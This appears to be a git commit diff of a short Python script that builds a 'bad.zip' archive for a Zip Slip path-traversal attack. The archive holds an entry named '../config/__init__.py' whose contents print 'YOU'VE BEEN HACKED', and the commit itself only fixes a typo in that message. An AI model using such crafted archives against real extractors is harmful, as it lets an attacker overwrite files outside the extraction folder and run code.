3252463b46111e5544312d4b9096dff3b52849d9
IShungite <ishungite@gmail.com>
2021-04-12 14:09:47 +0200

    Update

--- zip.py
+++ zip.py
@@ -4,7 +4,7 @@ import zipfile
 def zip_up():
     z_info = zipfile.ZipInfo(r"../config/__init__.py")
     z_file = zipfile.ZipFile("bad.zip", mode="w")
-    z_file.writestr(z_info, "print(\"YOU'VE BEED HACKED\")")
+    z_file.writestr(z_info, "print(\"YOU'VE BEEN HACKED\")")
     z_file.close()
 
 
